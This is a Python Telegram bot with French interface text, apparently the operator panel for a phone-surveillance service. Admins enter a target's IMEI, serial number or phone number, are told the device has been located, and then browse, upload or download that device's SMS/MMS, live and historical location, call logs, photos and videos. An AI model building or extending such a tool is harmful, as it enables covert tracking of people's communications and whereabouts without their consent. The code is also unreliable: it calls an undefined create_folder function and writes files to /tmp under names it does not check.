import os
import sqlite3
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ConversationHandler, ContextTypes, filters
from config import BOT_TOKEN, ADMIN_IDS, BOT_PASSWORD, DATA_PATH, DB_NAME
from file_manager import create_device_folder, list_devices, list_files, upload_file, download_file, delete_device_folder, validate_device_id, log_activity

# Configuration du logging
logging.basicConfig(filename='bot.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# États pour la conversation
PASSWORD, DEVICE_ID, CATEGORY, SUBCATEGORY, FILE_UPLOAD, FILE_DOWNLOAD, DELETE_DEVICE = range(7)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("Accès non autorisé. Seuls les administrateurs peuvent utiliser ce bot.")
        return ConversationHandler.END
    await update.message.reply_text("Veuillez entrer le mot de passe du bot.")
    return PASSWORD

async def check_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if user_input != BOT_PASSWORD:
        await update.message.reply_text("Mot de passe incorrect. Réessayez.")
        return PASSWORD
    await update.message.reply_text("Mot de passe correct. Entrez l'ID de l'appareil (IMEI, SN, ou numéro avec +).")
    return DEVICE_ID

async def handle_device_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    device_id = update.message.text.strip()
    if not validate_device_id(device_id):
        await update.message.reply_text("ID invalide. Utilisez un IMEI (15 chiffres), un numéro (+ suivi de 10-15 chiffres), ou un SN (5-20 caractères alphanumériques).")
        return DEVICE_ID
    context.user_data['device_id'] = device_id
    folder_path = create_device_folder(device_id)
    if not folder_path:
        await update.message.reply_text("Erreur lors de la création du dossier. Réessayez plus tard.")
        return ConversationHandler.END
    log_activity(DB_NAME, device_id, "create_folder", folder_path)
    await update.message.reply_text("Localisation terminée. Veuillez attendre 5 minutes pour un nouvel appareil.")
    await show_categories(update, context)
    return CATEGORY

async def show_categories(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱 SMS/MMS", callback_data='sms_mms')],
        [InlineKeyboardButton("📍 Localisation", callback_data='localisation')],
        [InlineKeyboardButton("📞 Journal d'appels", callback_data='call_log')],
        [InlineKeyboardButton("📷 Médias", callback_data='media')],
        [InlineKeyboardButton("🗑 Supprimer appareil", callback_data='delete_device')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Choisissez une catégorie:", reply_markup=reply_markup)
    return CATEGORY

async def handle_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    category = query.data
    context.user_data['category'] = category
    if category == 'delete_device':
        keyboard = [
            [InlineKeyboardButton("Confirmer la suppression", callback_data='confirm_delete')],
            [InlineKeyboardButton("Annuler", callback_data='cancel_delete')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(f"Voulez-vous vraiment supprimer le dossier de l'appareil {context.user_data['device_id']} ?", reply_markup=reply_markup)
        return DELETE_DEVICE
    await show_subcategories(update, context, category)
    return SUBCATEGORY

async def show_subcategories(update: Update, context: ContextTypes.DEFAULT_TYPE, category: str):
    subcategories = {
        'sms_mms': [
            InlineKeyboardButton("Suivi des SMS et MMS", callback_data='suividessmsemmms'),
            InlineKeyboardButton("Historique SMS", callback_data='historiquesms')
        ],
        'localisation': [
            InlineKeyboardButton("Localisation en temps réel", callback_data='realtime_location'),
            InlineKeyboardButton("Historique de localisation", callback_data='location_history')
        ],
        'call_log': [
            InlineKeyboardButton("Suivi des appels", callback_data='call_tracking'),
            InlineKeyboardButton("Historique des appels", callback_data='call_history')
        ],
        'media': [
            InlineKeyboardButton("Photos", callback_data='photos'),
            InlineKeyboardButton("Vidéos", callback_data='videos')
        ]
    }
    keyboard = [subcategories[category]] if category in subcategories else []
    keyboard.append([InlineKeyboardButton("Retour", callback_data='back_to_categories')])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.message.reply_text(f"Choisissez une sous-catégorie pour {category}:", reply_markup=reply_markup)
    return SUBCATEGORY

async def handle_subcategory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    subcategory = query.data
    if subcategory == 'back_to_categories':
        await show_categories(query, context)
        return CATEGORY
    context.user_data['subcategory'] = subcategory
    device_id = context.user_data['device_id']
    category = context.user_data['category']
    folder_path = os.path.join(DATA_PATH, device_id, category, subcategory)
    create_folder(folder_path)
    files = list_files(folder_path)
    if files:
        keyboard = [[InlineKeyboardButton(f, callback_data=f"download_{f}")] for f in files]
        keyboard.append([InlineKeyboardButton("Téléverser un fichier", callback_data='upload_file')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(f"Fichiers dans {folder_path}:", reply_markup=reply_markup)
        return FILE_DOWNLOAD
    await query.message.reply_text("Aucun fichier trouvé. Envoyez un fichier pour téléverser.")
    return FILE_UPLOAD

async def handle_file_action(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    device_id = context.user_data['device_id']
    category = context.user_data['category']
    subcategory = context.user_data['subcategory']
    folder_path = os.path.join(DATA_PATH, device_id, category, subcategory)
    if action == 'upload_file':
        await query.message.reply_text("Envoyez le fichier à téléverser.")
        return FILE_UPLOAD
    if action.startswith('download_'):
        file_name = action[len('download_'):]
        file_path = os.path.join(folder_path, file_name)
        local_path = f"/tmp/{file_name}"
        if download_file(file_path, local_path):
            with open(local_path, 'rb') as f:
                await query.message.reply_document(f, filename=file_name)
            os.remove(local_path)
            log_activity(DB_NAME, device_id, "download_file", file_path)
        else:
            await query.message.reply_text("Erreur lors du téléchargement du fichier.")
        await show_subcategories(query, context, category)
        return SUBCATEGORY
    return SUBCATEGORY

async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    device_id = context.user_data['device_id']
    category = context.user_data['category']
    subcategory = context.user_data['subcategory']
    file = update.message.document
    if not file:
        await update.message.reply_text("Veuillez envoyer un fichier.")
        return FILE_UPLOAD
    file_name = file.file_name
    file_path = os.path.join(DATA_PATH, device_id, category, subcategory, file_name)
    local_path = f"/tmp/{file_name}"
    file_obj = await file.get_file()
    await file_obj.download_to_drive(local_path)
    if upload_file(file_path, local_path):
        await update.message.reply_text(f"Fichier {file_name} téléversé avec succès.")
        log_activity(DB_NAME, device_id, "upload_file", file_path)
    else:
        await update.message.reply_text("Erreur lors du téléversement du fichier.")
    os.remove(local_path)
    await show_subcategories(update, context, category)
    return SUBCATEGORY

async def handle_delete_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    device_id = context.user_data['device_id']
    if action == 'confirm_delete':
        if delete_device_folder(device_id):
            await query.message.reply_text(f"Dossier de l'appareil {device_id} supprimé.")
            log_activity(DB_NAME, device_id, "delete_folder", f"/{device_id}")
        else:
            await query.message.reply_text("Erreur lors de la suppression du dossier.")
        return ConversationHandler.END
    await query.message.reply_text("Suppression annulée.")
    await show_categories(query, context)
    return CATEGORY

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Opération annulée.")
    return ConversationHandler.END

def main():
    # Initialisation de la base de données
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (device_id TEXT, action TEXT, file_path TEXT, timestamp DATETIME)''')
    conn.commit()
    conn.close()

    # Configuration du bot
    app = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, check_password)],
            DEVICE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_device_id)],
            CATEGORY: [CallbackQueryHandler(handle_category)],
            SUBCATEGORY: [CallbackQueryHandler(handle_subcategory)],
            FILE_UPLOAD: [MessageHandler(filters.Document.ALL, handle_file_upload)],
            FILE_DOWNLOAD: [CallbackQueryHandler(handle_file_action)],
            DELETE_DEVICE: [CallbackQueryHandler(handle_delete_device)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    app.add_handler(conv_handler)
    app.run_polling()

if __name__ == '__main__':
    main()